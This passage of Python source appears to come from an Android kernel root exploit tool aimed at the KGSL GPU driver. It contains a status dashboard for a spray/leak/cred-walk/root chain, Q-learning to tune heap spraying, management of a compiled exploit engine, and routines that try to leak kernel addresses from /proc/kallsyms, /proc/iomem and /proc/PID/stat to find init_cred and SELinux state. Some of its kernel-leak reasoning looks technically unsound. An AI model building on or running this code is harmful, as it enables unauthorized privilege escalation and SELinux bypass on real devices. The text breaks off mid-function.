             f"spray ({ec.get('spray_objects', 0)} obj)"),
            ("leak",     ec.get("leaked_va", 0) != 0,
             f"leak 0x{ec.get('leaked_va', 0):x}" if ec.get("leaked_va", 0) else "leak"),
            ("cred",     ec.get("cred_walked", False),
             "cred walked" if ec.get("cred_walked", False) else "cred"),
            ("root",     ec.get("root_achieved", False),
             "ROOT ACHIEVED!" if ec.get("root_achieved", False)
             else f"euid={euid_now}"),
        ]
        chain_str = " ".join(
            (f"{C.GRN}✓{C.RST}{name}" if done
             else f"{C.RED}✗{C.RST}{name}{info}")
            for name, done, info in chain_steps)
        kgsl_col = C.GRN if self.kgsl_fd is not None else C.GRY
        out.append(f" {C.BOLD}EXPLOIT{C.RST}: {chain_str}  "
                   f"{C.DIM}ioctl={C.CYN}{ec.get('ioctl_count', 0)}"
                   f"{C.RST}{C.DIM}/err={C.RED}{ec.get('ioctl_errors', 0)}"
                   f"{C.RST}{C.DIM} kgsl={kgsl_col}"
                   f"{'ON' if self.kgsl_fd is not None else 'off'}{C.RST}")
        # v4.1: show KGSL error reason if off
        if self.kgsl_fd is None and getattr(self, "kgsl_error", ""):
            out.append(f" {C.DIM}kgsl-err: {self.kgsl_error}{C.RST}")
        # Show cred uid/gid if walked
        if ec.get("cred_walked", False):
            out.append(f" {C.BOLD}CRED{C.RST}: uid={C.CYN}"
                       f"{ec.get('cred_uid', -1)}{C.RST} "
                       f"gid={C.CYN}{ec.get('cred_gid', -1)}{C.RST}  "
                       f"{C.DIM}step={ec.get('step', 'idle')}{C.RST}")

        # === v4.1: Q-TABLE TOP ACTIONS ===
        # v4.1: show BEST Q values across ALL states, not just
        # the current state. Otherwise when we're in a
        # degenerate state like (9, 8) (everything failing),
        # the table for THAT state is all 0.0 because it's
        # brand new — Q-updates happened for other states.
        # Showing best across all states tells the user what
        # the AI has actually LEARNED, not just the state
        # we happen to be in.
        if self.q_table:
            cur_state = (
                min(9, self._adaptive_scan.get("no_match_batches", 0)),
                int(self.live.get("kill_count", 0)
                    / max(1, self.live.get("spray_count", 0)) * 10),
            )
            cur_q = self.q_table.get(cur_state)
            if cur_q:
                # Best 3 from current state
                top3 = sorted(cur_q.items(), key=lambda kv: -kv[1])[:3]
                top_str = " ".join(f"{a[0]}={a[1]}({v:.1f})"
                                   for a, v in top3)
            else:
                top_str = "(no data for this state yet)"
            # Also: best 3 from ALL states combined
            all_pairs = []
            for st, q in self.q_table.items():
                for a, v in q.items():
                    if v != 0.0:
                        all_pairs.append((st, a, v))
            if all_pairs:
                all_pairs.sort(key=lambda x: -x[2])
                best3 = all_pairs[:3]
                best_str = " ".join(
                    f"{a[0]}={a[1]}@{st[0]},{st[1]}({v:.1f})"
                    for st, a, v in best3)
            else:
                best_str = "(none learned yet)"
            out.append(f" {C.BOLD}Q-LEARN{C.RST} "
                       f"(now={cur_state[0]},{cur_state[1]}): "
                       f"{C.MAG}{top_str}{C.RST}  "
                       f"{C.DIM}best: {best_str}{C.RST}")

        if L["scan_total"] > 0 or L["spray_target"] > 0:
            if L["spray_target"] > 0:
                pct = min(100, 100 * L["spray_count"] // max(1, L["spray_target"]))
                bar = self._bar(pct, 32, C.CYN)
                # Show kills ratio prominently. If >80% kills, paint
                # red — that's the symptom of spray procs not
                # surviving long enough to land in KGSL.
                total_sprayed = max(1, L["spray_count"])
                kill_ratio = 100.0 * L["kill_count"] / total_sprayed
                kill_col = (C.RED if kill_ratio > 80 else
                            C.YEL if kill_ratio > 50 else C.GRY)
                out.append(f" {C.BOLD}SPRAY {C.RST}{spray_p} {bar} {pct:3d}%  "
                           f"({L['spray_count']}/{L['spray_target']})  "
                           f"kills:{kill_col}{L['kill_count']}{C.RST}({kill_ratio:.0f}%)")
            if L["scan_total"] > 0:
                pct = min(100, 100 * L["scan_offset"] // max(1, L["scan_total"]))
                bar = self._bar(pct, 32, C.YEL)
                out.append(f" {C.BOLD}SCAN  {C.RST}  {bar} {pct:3d}%  "
                           f"({L['scan_offset']:#x}/{L['scan_total']:#x})")

        # AI Stats — short roll-up of the learning state. The
        # current cycle's stats are in self.learn_stats; if missing
        # (e.g. learning not started), we show zeros.
        ls = getattr(self, 'learn_stats', None) or {}
        n_matches  = ls.get('matches', 0)
        n_verified = ls.get('verified', 0)
        n_fp       = ls.get('false_positives', 0)
        n_sprayed  = ls.get('sprayed_total', 0)
        n_batches  = ls.get('batches', 0)
        n_kbase    = 1 if self.kernel_base else 0
        n_selinux  = 1 if self.selinux_va else 0
        n_cred     = 1 if self.cred_va else 0
        # Per-type counts in found_items
        type_counts = {}
        for it in self.found_items:
            t = it.get('type', '?')
            type_counts[t] = type_counts.get(t, 0) + 1
        # Top 4 most common types
        top = sorted(type_counts.items(), key=lambda kv: -kv[1])[:4]
        types_line = " · ".join(f"{t}={n}" for t, n in top) if top else "none"
        # Hit rate (verified / matches) — quality indicator
        if n_matches > 0:
            hit_rate = 100.0 * n_verified / n_matches
            hr_color = C.GRN if hit_rate > 50 else (C.YEL if hit_rate > 20 else C.RED)
        else:
            hit_rate = 0.0
            hr_color = C.GRY
        out.append(f" {C.BOLD}AI{C.RST}: "
                   f"batches={C.CYN}{n_batches}{C.RST} "
                   f"sprayed={C.CYN}{n_sprayed}{C.RST} "
                   f"xattr={C.MAG}{ls.get('xattrs_set', 0)}{C.RST} "
                   f"matches={C.YEL}{n_matches}{C.RST} "
                   f"verified={C.GRN}{n_verified}{C.RST} "
                   f"falsePos={C.RED}{n_fp}{C.RST} "
                   f"hitRate={hr_color}{hit_rate:4.1f}%{C.RST} "
                   f"{C.DIM}oom={self.live.get('oom_kills', 0)}"
                   f"{C.RST}{C.DIM} engOK={self.live.get('engine_verified', False)}"
                   f"{C.RST}")

        # Per-Worker status — show each of the 3 subworkers
        # independently so the user can see at a glance whether all
        # three are alive (and their individual spray counts). Before
        # this, the TUI just showed "1/3 workers" as a single number
        # and there was no way to tell which worker had died.
        if self._learn_subworkers or self.w3_enabled:
            worker_parts = []
            for wid in range(LEARN_WORKERS):
                t = self._learn_subworkers[wid] if wid < len(self._learn_subworkers) else None
                alive = t is not None and t.is_alive()
                pids  = self.spray_procs_by_worker.get(wid, set())
                state = f"{C.GRN}●{C.RST}" if alive else f"{C.RED}●{C.RST}"
                worker_parts.append(
                    f"W{wid}{state}{len(pids)}")
            # W3 deep-scan worker (4th worker, no spray, just
            # re-scans Empty Page locations to see if anything
            # appeared there since the original scan).
            w3_alive = (self.w3_thread
                        and self.w3_thread.is_alive()
                        and self.w3_enabled)
            w3_state = f"{C.GRN}●{C.RST}" if w3_alive else f"{C.GRY}○{C.RST}"
            worker_parts.append(f"W3{w3_state}D")
            out.append(f" {C.BOLD}WORKERS{C.RST}: "
                   f"{' '.join(worker_parts)}  "
                   f"{C.GRY}(●=alive n=spray procs, W3=deep-scan){C.RST}  "
                   f"{C.GRY}adapt={self._adaptive_scan.get('offset_idx', 0)}"
                   f"/{self._adaptive_scan.get('no_match_batches', 0)}nm{C.RST}")
        # kbase coloring — use a different color when we don't know it
        # yet so the user can tell at a glance.
        kbase_s   = f"{self.kernel_base:#x}" if self.kernel_base else "0x??????"
        kbase_col = C.CYN if self.kernel_base else C.GRY
        sel_s     = f"{self.selinux_va:#x}" if self.selinux_va else "0x??????"
        sel_col   = C.RED if self.selinux_va else C.GRY
        cred_s    = f"{self.cred_va:#x}" if self.cred_va else "0x??????"
        cred_col  = C.GRN if self.cred_va else C.GRY
        out.append(f" {C.BOLD}KERNEL{C.RST}: "
                   f"kbase={kbase_col}{kbase_s}{C.RST} "
                   f"selinux={sel_col}{sel_s}{C.RST} "
                   f"init_cred={cred_col}{cred_s}{C.RST}")
        # v4.1: show kallsyms cache if loaded — this proves that
        # the explorer is working even when engine pipe is broken
        # (pages=0, scans=0). The user sees real symbol addresses.
        if self.kallsyms:
            kc = C.MAG
            syms_line = (f"commit_creds={kc}0x"
                         f"{self.kallsyms.get('commit_creds', 0):x}{C.RST} "
                         f"prep_kc={kc}0x"
                         f"{self.kallsyms.get('prepare_kernel_cred', 0):x}{C.RST} "
                         f"init_cred={kc}0x"
                         f"{self.kallsyms.get('init_cred', 0):x}{C.RST} "
                         f"selinux={kc}0x"
                         f"{self.kallsyms.get('selinux_state', 0):x}{C.RST}")
            out.append(f" {C.DIM}SYMS :{C.RST} {syms_line}")
        out.append(f" {C.DIM}found types: {types_line}{C.RST}")
        # v4.1: kallsyms summary line so the user can see at a
        # glance whether /proc/kallsyms gave us anything. Without
        # this they have to press [kb] to see what's loaded.
        ksum = self.live.get("kallsyms_summary", "")
        if ksum:
            out.append(f" {C.DIM}KS   :{C.RST} {ksum}")

        out.append(f"{C.GRY}{'─'*92}{C.RST}")
        # Memory Map — visual address-space heatmap so the user can
        # see where found items cluster at a glance. We bucket the
        # 64-bit address space into 16 wide regions and count items
        # in each.
        if self.found_items:
            import bisect as _bisect
            # 16 buckets covering 0xffffff80_00000000 .. 0xffffffc0_00000000
            # (the typical AArch64 kernel VA range).
            bucket_edges = [
                0xffffff8000000000, 0xffffff8800000000,
                0xffffff9000000000, 0xffffff9800000000,
                0xffffffa000000000, 0xffffffa800000000,
                0xffffffb000000000, 0xffffffb800000000,
                0xffffffc000000000, 0xffffffc400000000,
                0xffffffc800000000, 0xffffffcc00000000,
                0xffffffd000000000, 0xffffffd800000000,
                0xffffffe000000000, 0xfffffff000000000,
            ]
            bucket_counts = [0] * (len(bucket_edges) + 1)
            bucket_types  = [[] for _ in range(len(bucket_edges) + 1)]
            for it in self.found_items:
                try:
                    v = int(it['va'], 16)
                except Exception:
                    continue
                idx = _bisect.bisect_left(bucket_edges, v)
                bucket_counts[idx] += 1
                t = it.get('type', '?')
                if t not in bucket_types[idx]:
                    bucket_types[idx].append(t)
            # Render only buckets that have items OR that contain
            # kbase/uaf_start. Cap at 8 lines so the TUI doesn't
            # grow unbounded.
            lines_to_show = []
            for i, count in enumerate(bucket_counts):
                if count == 0 and not (
                    (i > 0 and bucket_edges[i-1] == (self.kernel_base & ~0x7FFFFFFFF))
                    if self.kernel_base else False):
                    continue
                lo = bucket_edges[i-1] if i > 0 else 0xffffff8000000000
                hi = bucket_edges[i]   if i < len(bucket_edges) else 0xffffffffffffffff
                bar_len = min(count, 20)
                bar = '█' * bar_len + '░' * (20 - bar_len)
                types_str = ','.join(bucket_types[i][:3]) if bucket_types[i] else ''
                # Mark special addresses
                marker = ""
                if self.kernel_base and lo <= self.kernel_base < hi:
                    marker = " ← kbase"
                elif self.uaf_start and lo <= self.uaf_start < hi:
                    marker = " ← uaf_start"
                elif self.cred_va and lo <= self.cred_va < hi:
                    marker = " ← init_cred"
                lines_to_show.append(
                    f"  {C.GRY}0x{lo:016x}{C.RST} {C.CYN}{bar}{C.RST} {count:3d} {types_str}{marker}")
                if len(lines_to_show) >= 8:
                    break
            if lines_to_show:
                out.append(f" {C.BOLD}{C.MAG}[MEMORY MAP]{C.RST} "
                           f"{C.DIM}(found items, 64-bit kernel VA){C.RST}")
                for ln in lines_to_show:
                    out.append(ln)
                out.append(f"{C.GRY}{'─'*92}{C.RST}")

            # === SPRAY MAP (8x8 grid of UAF address space) ===
            # Each cell represents a 512KB bucket of the UAF range.
            # Color codes (legend below):
            #   ░ = unscanned       (gray)
            #   ▒ = spraying now    (yellow)
            #   █ = spray error     (red)
            #   ▓ = scanning now    (orange)
            #   ◆ = scan error      (dark orange / magenta)
            #   · = done (empty)    (blue/gray)
            #   ★ = FOUND!          (green)
            sm = self.spray_map
            if any(sm):  # only show if there's something
                out.append(f" {C.BOLD}{C.CYN}[SPRAY MAP]{C.RST} "
                           f"{C.DIM}(8×8 grid of 32MB UAF, 512KB/bucket){C.RST}")
                grid_chars = {
                    0: (f"{C.GRY}░",  "unscanned"),
                    1: (f"{C.YEL}▒",  "spraying"),
                    2: (f"{C.RED}█",  "spray err"),
                    3: (f"{C.MAG}▓",  "scanning"),
                    4: (f"{C.RED}◆",  "scan err"),
                    5: (f"{C.BLU}·",  "done-empty"),
                    6: (f"{C.GRN}★",  "FOUND!"),
                }
                # Render as 8 rows of 8 cells, with a VA annotation
                # for the first column of each row.
                for row in range(8):
                    cells = []
                    for col in range(8):
                        bidx = row * 8 + col
                        if bidx < len(sm):
                            ch, _ = grid_chars.get(
                                sm[bidx], (f"{C.GRY}░", "unscanned"))
                            cells.append(ch)
                        else:
                            cells.append(f"{C.GRY}░")
                    # First cell of each row shows the VA offset
                    va_off = row * 8 * self.SPRAY_MAP_BUCKET_SIZE
                    va_str = f"0x{va_off:07x}"
                    out.append(
                        f"   {C.DIM}{va_str}{C.RST}  "
                        f"{''.join(cells)}{C.RST}")
                # Legend
                legend_parts = []
                for code, (ch, name) in grid_chars.items():
                    if any(c == code for c in sm):
                        legend_parts.append(f"{ch}{C.RST}={name}")
                out.append(f"   {C.GRY}legend: "
                           f"{' '.join(legend_parts)}{C.RST}")
                out.append(f"{C.GRY}{'─'*92}{C.RST}")
        out.append(f" {C.BOLD}{C.WHT}[FILE MANAGER VIEW] — Found Memory Offsets  "
                   f"{C.GRY}({len(self.found_items)} total){C.RST}")
        out.append(f"{C.GRY}{'─'*92}{C.RST}")
        if not self.found_items:
            out.append(f" {C.GRY}(No items yet — press {C.WHT}[E]{C.GRY} to exploit, "
                       f"{C.WHT}[L]{C.GRY} to learn, {C.WHT}[S]{C.GRY} to scan){C.RST}")
        else:
            total = len(self.found_items)
            display = self.found_items[-20:]
            # Distribution summary — count types in the full set so
            # the user sees the overall learning progress.
            type_counts = {}
            for it in self.found_items:
                t = it.get('type', '?')
                type_counts[t] = type_counts.get(t, 0) + 1
            top_types = sorted(type_counts.items(),
                               key=lambda kv: -kv[1])[:5]
            if top_types:
                summary = " · ".join(f"{t}={n}" for t, n in top_types)
                out.append(f" {C.DIM}types: {summary}{C.RST}")
            for i, item in enumerate(display):
                idx = total - len(display) + i
                color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
                         "System App": C.BLU, "Kernel Code": C.MAG,
                         "SELinux": C.RED, "SELinux (PATCHED)": C.GRN,
                         "Privilege Struct (ROOTED)": C.GRN,
                         "Kernel Global": C.CYN, "Kernel Heap": C.CYN,
                         "Task Struct": C.YEL, "Kernel Strings": C.BLU,
                         "Spray Marker": C.YEL,
                         "Unknown Object": C.GRY}.get(item['type'], C.GRY)
                # Confidence bar — visualize the 0-100 confidence
                # value as a 6-char bar so the user can see at a
                # glance which items are solid hits.
                conf = int(item.get('confidence', 0))
                bar = ('█' * (conf // 20) +
                       '░' * (5 - conf // 20))
                # Description + compact summary
                desc = item['description'][:42]
                # Show a brief data hint if we have it — e.g. comm
                # string or comm for a task_struct.
                data_hint = ""
                if 'data' in item and item['data']:
                    d = item['data']
                    if isinstance(d, (bytes, bytearray)):
                        # Find first printable run of 4+ chars
                        run = b""
                        for b in d:
                            if 0x20 <= b <= 0x7e:
                                run += bytes([b])
                            else:
                                if len(run) >= 4:
                                    break
                                run = b""
                        if len(run) >= 4:
                            data_hint = f" [{run[:14].decode(errors='ignore')}]"
                out.append(
                    f" {C.GRY}└──{C.RST} {C.BOLD}{color}[{idx:02d}]{C.RST} "
                    f"{color}{item['type']:<22}{C.RST} │ "
                    f"{C.WHT}{desc:<42}{C.RST} │ "
                    f"{C.CYN}{item['va']}{C.RST}"
                    f"  {C.GRY}{bar}{C.RST} {conf:>3}%{data_hint}")
            if total > 20:
                out.append(f" {C.DIM}… and {total - 20} more (type 'list' to see all){C.RST}")

        # v4.1.25: removed buttons from TUI body. They are
        # now rendered ONCE on startup in the bottom region
        # and never touched by TUI redraws. The TUI body
        # only contains the live status data; the buttons
        # and prompt are static and stay in the bottom
        # region forever.
        # out.append(f"{C.GRY}{'─'*92}{C.RST}")
        # out.append(
        #     f" {C.GRN}[A]{C.RST} AUTOPILOT       "
        #     f" {C.GRN}[P]{C.RST} Pause           "
        #     f" {C.GRN}[G]{C.RST} Resume          "
        #     f" {C.GRN}[X]{C.RST} Stop"
        # )
        # out.append(
        #     f" {C.BLU}[R]{C.RST} Verify Root       "
        #     f" {C.BLU}[B]{C.RST} Rebuild Engine    "
        #     f" {C.BLU}[Q]{C.RST} Exit Explorer     "
        #     f" {C.BLU}[ID]{C.RST} Open File"
        # )
        # out.append(
        #     f" {C.BLU}[list]{C.RST} Show All Items "
        #     f" {C.BLU}[kb]{C.RST} Kernel Intel   "
        #     f" {C.BLU}[log]{C.RST} Spray Log"
        # )
        # out.append(
        #     f" {C.BLU}[stats]{C.RST} AI Stats    "
        #     f" {C.BLU}[save]{C.RST} Export JSON  "
        #     f" {C.BLU}[dev]{C.RST} Device Info"
        # )
        # out.append(
        #     f" {C.BLU}[v<N>]{C.RST} Re-verify    "
        #     f" {C.BLU}[walk]{C.RST} Cred chain   "
        #     f" {C.BLU}[w3]{C.RST} Deep-scan   "
        #     f" {C.BLU}[rva]{C.RST} Read VA  "
        #     f" {C.BLU}[N/{C.RST}{C.BLU}N]{C.RST} Open   "
        #     f" {C.BLU}[health]{C.RST} Health   "
        #     f" {C.BLU}[englog]{C.RST} Engine Stderr   "
        #     f" {C.BLU}[tstack]{C.RST} Task Stacks   "
        #     f" {C.BLU}[vcomm]{C.RST} Verify Comm   "
        #     f" {C.BLU}[kb]{C.RST} Kernel Bases"
        # )
        # out.append(f"{C.GRY}{'─'*92}{C.RST}")

        if self.spray_log:
            out.append(f" {C.BOLD}{C.MAG}LIVE LOG STREAM{C.RST} {C.GRY}(last 3){C.RST}")
            for e in self.spray_log[-3:]:
                et = e.get("type", "?")
                if et == "spray":
                    out.append(f"  {C.CYN}▸{C.RST} SPRAY  pid={C.WHT}{e.get('pid',0):<6}{C.RST} "
                               f"name={C.YEL}{e.get('name','?'):<14}{C.RST} "
                               f"batch={C.GRY}{e.get('batch',0)}{C.RST}")
                elif et == "kill":
                    out.append(f"  {C.RED}✗{C.RST} KILL   pid={C.WHT}{e.get('pid',0)}{C.RST}")
                elif et == "scan_match":
                    out.append(f"  {C.GRN}✓{C.RST} MATCH  va={C.CYN}{hex(e.get('va',0)):<14}{C.RST} "
                               f"type={C.MAG}{e.get('type','?')}{C.RST}")
                elif et == "patch":
                    out.append(f"  {C.YEL}⚡{C.RST} PATCH  va={C.CYN}{e.get('va','?')}{C.RST} "
                               f"val={e.get('val','?')} → {e.get('result','?')}")
            out.append(f"{C.GRY}{'─'*92}{C.RST}")

        if hint:
            out.append(f" {C.MAG}HINT{C.RST}: {C.WHT}{hint}{C.RST}")
        out.append(f" {C.GRY}LAST CMD{C.RST}: {C.CYN}{L['last_command']}{C.RST}    "
                   f"{C.GRY}(↑/↓ history, Ctrl+E rewind, Ctrl+P stop 'L', 'log' to dump){C.RST}")

        # v4.1.25: limit TUI body to 20 lines. The bottom
        # region (rows 22+) is reserved for the static
        # buttons + prompt. If we wrote more than 20 lines
        # here, we'd overwrite the buttons. Truncate to 20
        # to keep the layout stable.
        if len(out) > 20:
            out = out[:20]

        # Write with EXPLICIT \r\n between lines (Termux-safe,
        # works whether OPOST is on or off). NO trailing \r\n —
        # the prompt is on the same line as the cursor.
        sys.stdout.write("\r\n".join(out))
        sys.stdout.flush()

    # ============== ENGINE MANAGEMENT ==============
    def ensure_engine(self):
        # engine_lock is RLock, so it's safe to call from inside
        # _engine_write which also holds the lock.
        with self.engine_lock:
            if self.exploit_proc:
                if self.exploit_proc.poll() is None:
                    return True
                else:
                    try:
                        err = self.exploit_proc.stderr.read().decode()
                    except Exception:
                        err = ""
                    self.live["last_msg"] = f"Engine died: {err.strip()[:80]}"
                    self.log_event("engine_died", {"code": self.exploit_proc.returncode, "err": err})
                    self.exploit_proc = None

            # Check format / missing
            if os.path.exists(self.engine_path):
                try:
                    with open(self.engine_path, "rb") as f:
                        head = f.read(4)
                    if head[:4] != b"\x7fELF":
                        self.try_compile_engine()
                except Exception:
                    self.try_compile_engine()
            else:
                self.try_compile_engine()

            try:
                self.exploit_proc = subprocess.Popen(
                    [self.engine_path],
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE, text=False, bufsize=0,
                )
                # Update the live status so the TUI header shows the
                # real engine PID (was staying at 0 after a rebuild).
                with self.stats_lock:
                    self.live["engine_pid"] = self.exploit_proc.pid
                self.live["last_msg"] = f"Engine started (pid={self.exploit_proc.pid})"
                self.log_event("engine_start", {"pid": self.exploit_proc.pid})
                # v4.1.13: start a daemon thread that continuously
                # reads engine stderr. The engine emits critical
                # diagnostic messages on stderr (e.g. "[UAF] failed:
                # Operation not permitted", "[SCAN] total=... pages,
                # empty=N, nonzero=M, hits=K"). Without this thread
                # the messages just sit in the PIPE buffer (4KB-64KB
                # depending on libc) and are lost. Now we capture
                # them in self._engine_stderr (deque, max 200 lines)
                # and they're visible via [englog] command and the
                # TUI status line.
                import threading as _thr
                import collections as _col
                if not hasattr(self, "_engine_stderr") or \
                        self._engine_stderr is None:
                    self._engine_stderr = _col.deque(maxlen=200)
                def _drain_engine_stderr():
                    while True:
                        try:
                            if not self.exploit_proc:
                                return
                            if self.exploit_proc.stderr is None:
                                return
                            line = self.exploit_proc.stderr.readline()
                            if not line:
                                # Engine closed stderr (likely exited)
                                return
                            try:
                                l = line.decode("utf-8", errors="replace").rstrip()
                            except Exception:
                                l = str(line)
                            if l:
                                self._engine_stderr.append(l)
                                # Also write to a debug log so we
                                # can review after the session.
                                try:
                                    with open("/sdcard/kgsl_eng.log", "a") as _f:
                                        _f.write(l + "\n")
                                except Exception:
                                    pass
                        except Exception:
                            return
                _t = _thr.Thread(target=_drain_engine_stderr,
                                 daemon=True, name="eng-stderr")
                _t.start()
                return True
            except Exception as e:
                self.live["last_msg"] = f"Engine start failed: {e}"
                return False

    def try_compile_engine(self):
        src = self.engine_path + ".c"
        if not os.path.exists(src):
            return False
        for comp in ("gcc", "clang"):
            try:
                subprocess.check_call([comp, "-O2", src, "-o", self.engine_path, "-lpthread"])
                return True
            except Exception:
                continue
        return False

    def read_proc_stack(self, pid):
        """v4.1: read /proc/PID/stack to find kernel stack
        pointer for this thread. The kernel stack is allocated
        adjacent to the task_struct, so this gives us a known
        address near the task_struct. From there we can search
        the slab for the actual task_struct (comm is at +0x718
        on 5.4 ARM64 GKI).

        Returns the kernel stack address (top of stack) or None.
        """
        try:
            with open(f"/proc/{pid}/stack", "r") as f:
                lines = f.readlines()
        except (PermissionError, FileNotFoundError, ProcessLookupError, OSError):
            return None
        # /proc/PID/stack looks like:
        # [<ffffffffc0123456>] some_function+0x42/0x80
        # ...
        # The first address is the bottom of the stack.
        if not lines:
            return None
        first = lines[0].strip()
        if first.startswith("[<") and ">]" in first:
            try:
                addr_str = first[2:first.index(">]")]
                return int(addr_str, 16)
            except Exception:
                return None
        return None

    def parse_iomem(self):
        """v4.1: read /proc/iomem to find kernel text/data
        physical addresses. On most Android kernels, this is
        world-readable and reveals the layout:
          00000000-00001fff : System RAM
          ...
          80000000-8fffffff : Kernel code   (varies)
          90000000-afffffff : Kernel data   (varies)
          ...

        On ARM64 with KASLR, /proc/iomem is restricted to
        CAP_SYS_ADMIN — but on many stock Android kernels
        it remains world-readable, which lets us find
        kernel virtual→physical mapping.

        Returns a list of (start, end, name) tuples. Empty
        if /proc/iomem is restricted.
        """
        try:
            with open("/proc/iomem", "r") as f:
                lines = f.readlines()
        except (PermissionError, FileNotFoundError, OSError):
            return []
        regions = []
        for line in lines:
            # Format: "00000000-00001fff : System RAM"
            line = line.strip()
            if ":" not in line:
                continue
            try:
                rng, name = line.split(":", 1)
                rng = rng.strip()
                name = name.strip()
                if "-" in rng:
                    a, b = rng.split("-", 1)
                    start = int(a, 16)
                    end = int(b, 16)
                    regions.append((start, end, name))
            except Exception:
                continue
        return regions

    def parse_kallsyms_raw(self):
        """v4.1: read /proc/kallsyms without the kptr_restrict
        filter. On Android with kptr_restrict=2, addresses are
        zeroed. But some kernel versions leak the address via
        /proc/[pid]/kallsyms if the reader has CAP_SYSLOG.
        We try that path too. Returns the same format as
        kallsyms dict.
        """
        syms = {}
        # Try main /proc/kallsyms first
        for path in ("/proc/kallsyms", "/proc/self/kallsyms",
                     "/proc/thread-self/kallsyms"):
            try:
                with open(path, "r") as f:
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 3:
                            try:
                                addr = int(parts[0], 16)
                            except ValueError:
                                continue
                            syms[parts[2]] = addr
            except (PermissionError, FileNotFoundError, OSError):
                continue
        return syms

    def cmd_vcomm(self):
        """v4.1.17: verify /proc/PID/comm for every live spray
        proc. The helper runs `prctl(PR_SET_NAME, name)` which
        sets task_struct->comm = name. Reading /proc/PID/comm
        shows what's actually in task_struct. If comm shows
        "python3" or empty, the helper crashed before prctl
        ran (e.g. CDLL(None) failed on Termux). If comm shows
        KETO0422XXXXX, the marker IS in task_struct and the
        scanner should be able to find it (else the scan
        range is wrong).
        """
        self.live["last_command"] = "vcomm"
        my_pids = set()
        for s in self.spray_procs_by_worker.values():
            my_pids.update(s)
        if not my_pids:
            return "No live spray procs"
        out = []
        out.append(f"{C.BOLD}{C.CYN}=== SPRAY COMM VERIFICATION ==={C.RST}")
        out.append(f"{C.GRY}{'-'*65}{C.RST}")
        keto_ok = 0
        keto_wrong = 0
        stack_ok = 0
        sample = []
        for pid in list(my_pids)[:20]:
            try:
                with open(f"/proc/{pid}/comm", "r") as f:
                    comm = f.read().strip()
            except Exception:
                comm = "?"
            stack = self.read_proc_stack(pid)
            if stack is not None:
                stack_ok += 1
            if "KETO" in comm or "KETW" in comm:
                keto_ok += 1
            else:
                keto_wrong += 1
            if len(sample) < 5:
                sample.append((pid, comm, hex(stack) if stack else "denied"))
        out.append(f" {C.BOLD}Total{C.RST}: {len(my_pids)} live, "
                   f"sampled {min(20, len(my_pids))}")
        out.append(f" {C.GRN}KETO comm{C.RST}: {keto_ok}")
        out.append(f" {C.RED}wrong comm{C.RST}: {keto_wrong}")
        out.append(f" {C.CYN}stack read{C.RST}: {stack_ok}")
        out.append(f"{C.GRY}{'-'*65}{C.RST}")
        for pid, comm, stack in sample:
            color = C.GRN if ("KETO" in comm or "KETW" in comm) else C.RED
            out.append(
                f" pid={C.WHT}{pid:<6}{C.RST} "
                f"comm={color}{comm:<16}{C.RST} "
                f"stack={C.GRY}{stack}{C.RST}")
        out.append(f"{C.GRY}{'-'*65}{C.RST}")
        if keto_wrong > keto_ok:
            out.append(
                f" {C.RED}FAIL{C.RST}: spray helper is not setting "
                f"comm. Most procs have wrong comm. Check helper "
                f"string and CDLL call in _popen_spray.")
        elif keto_ok > 0 and stack_ok == 0:
            out.append(
                f" {C.YEL}NOTE{C.RST}: comm is set but "
                f"/proc/PID/stack is denied. kptr_restrict=2 blocks "
                f"the per-PID stack dump. Need root or another "
                f"kernel leak to bypass.")
        elif keto_ok > 0 and stack_ok > 0:
            out.append(
                f" {C.GRN}OK{C.RST}: comm AND stack readable. "
                f"Use [tstack] for stack addresses, then targeted "
                f"scan should find task_structs.")
        else:
            out.append(
                f" {C.RED}EMPTY{C.RST}: no live spray procs with "
                f"valid comm. Spray loop is broken.")
        return "\n".join(out)

    def cmd_kb_known_ranges(self):
        """v4.1.21: kernel base leak via /proc/PID/stat.

        On many Android 5.4-5.10 kernels, the start_code
        field in /proc/PID/stat is a 64-bit address that
        leaks the kernel text base even when
        kptr_restrict=2. This is a well-known
        /proc-leak. The trick: stat field 27 (after the
        comm in parens) is start_code which on x86_64 and
        ARM64 is sometimes the kernel text pointer (not
        the user-space text base, despite the name).

        We iterate over all live spray procs, parse their
        stat, and look for any value that looks like a
        kernel address (high bit set, in
        0xffffff80..0xfffffffe range). The first one
        found is the kernel text base (or close to it).

        Also: tries the kernel_scanner binary if built.
        """
        self.live["last_command"] = "kb"
        out = []
        out.append(f"{C.BOLD}{C.CYN}=== KERNEL BASE LEAK ==={C.RST}")
        out.append(f"{C.GRY}{'-'*65}{C.RST}")
        my_pids = set()
        for s in self.spray_procs_by_worker.values():
            my_pids.update(s)
        # 1. Try the C binary
        helper_bin = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "kernel_scanner")
        if os.path.isfile(helper_bin) and os.access(helper_bin, os.X_OK):
            try:
                pids_file = "/tmp/_kb_pids.txt"
                with open(pids_file, "w") as f:
                    for pid in my_pids:
                        f.write(f"{pid}\n")
                import subprocess as _sp
                out_file = "/sdcard/kgsl_kern_leak.log"
                r = _sp.run(
                    [helper_bin, pids_file, out_file],
                    capture_output=True, text=True, timeout=15)
                # parse out_file for stat.f27 entries
                if os.path.isfile(out_file):
                    with open(out_file) as f:
                        for line in f:
                            if "stat.f27" in line:
                                out.append(
                                    f" {C.GRN}LEAK{C.RST}: "
                                    f"{line.strip()}")
                    os.remove(out_file)
                os.remove(pids_file)
            except Exception as e:
                out.append(
                    f" {C.RED}kernel_scanner fail{C.RST}: {e}")
        # 2. Fall back to Python parsing of /proc/PID/stat
        kbase = 0
        for pid in list(my_pids)[:30]:
            try:
                with open(f"/proc/{pid}/stat") as f:
                    content = f.read()
                # parse: pid (comm) state ppid ... field27
                p1 = content.find(")")
                if p1 < 0:
                    continue
                rest = content[p1+1:].split()
                # rest[0] is state char, then fields 2..44+
                # start_code is at field index 24 (zero-based
                # in the rest array, since rest[0]=state)
                # actually: rest[24] = start_code
                if len(rest) >= 27:
                    sc = int(rest[25])  # 0-indexed
                    if 0xffffff8000000000 <= sc <= 0xffffffffffffffff:
                        if kbase == 0:
                            kbase = sc
                        out.append(
                            f" {C.GRN}pid={pid}{C.RST} "
                            f"start_code=0x{sc:016x} ← kernel!")
            except Exception:
                pass
        if kbase:
            out.append(f"{C.GRY}{'-'*65}{C.RST}")
            out.append(
                f" {C.BOLD}FOUND kernel base{C.RST}: 0x{kbase:016x}")
            out.append(
